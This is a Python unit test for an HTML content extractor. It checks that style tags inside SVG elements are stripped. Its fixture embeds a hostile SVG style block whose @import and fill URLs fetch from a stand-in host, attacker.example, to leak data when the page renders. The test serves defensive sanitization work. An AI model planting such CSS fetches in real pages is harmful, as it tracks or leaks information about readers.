"""Tests for SVG sanitization.

Verifies that style tags inside SVG elements are stripped to prevent
CSS-based external fetches.
"""

from domdown import Domdown, DomdownOptions
from domdown.utils.dom import parse_html


class TestSVGSanitization:
    """Tests for SVG element sanitization."""

    def test_strips_style_inside_svg_to_prevent_css_external_fetches(self) -> None:
        """Style tags inside SVG should be stripped to prevent CSS-based external fetches."""
        html = """<!DOCTYPE html>
<html>
<head><title>SVG style leak</title></head>
<body>
<article>
<h1>SVG style leak</h1>
<p>Lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua ut enim ad minim veniam quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
<svg viewBox="0 0 200 200" width="200" height="200">
<style>@import url("http://attacker.example/leak.css"); .x { fill: url("http://attacker.example/img.png"); }</style>
<circle class="x" cx="100" cy="100" r="80"/>
</svg>
<p>More content paragraph two that helps ensure the article scoring picks the right element so the SVG is preserved within the chosen content element for inspection here.</p>
<p>Third paragraph just adding more content to make this look like a real article worth extracting from the page properly without removal.</p>
</article>
</body>
</html>"""

        doc = parse_html(html)
        result = Domdown(doc, DomdownOptions(url="https://example.com/svg-style")).parse()

        assert "@import" not in result.content
        assert "attacker.example" not in result.content
        assert "<style" not in result.content.lower()
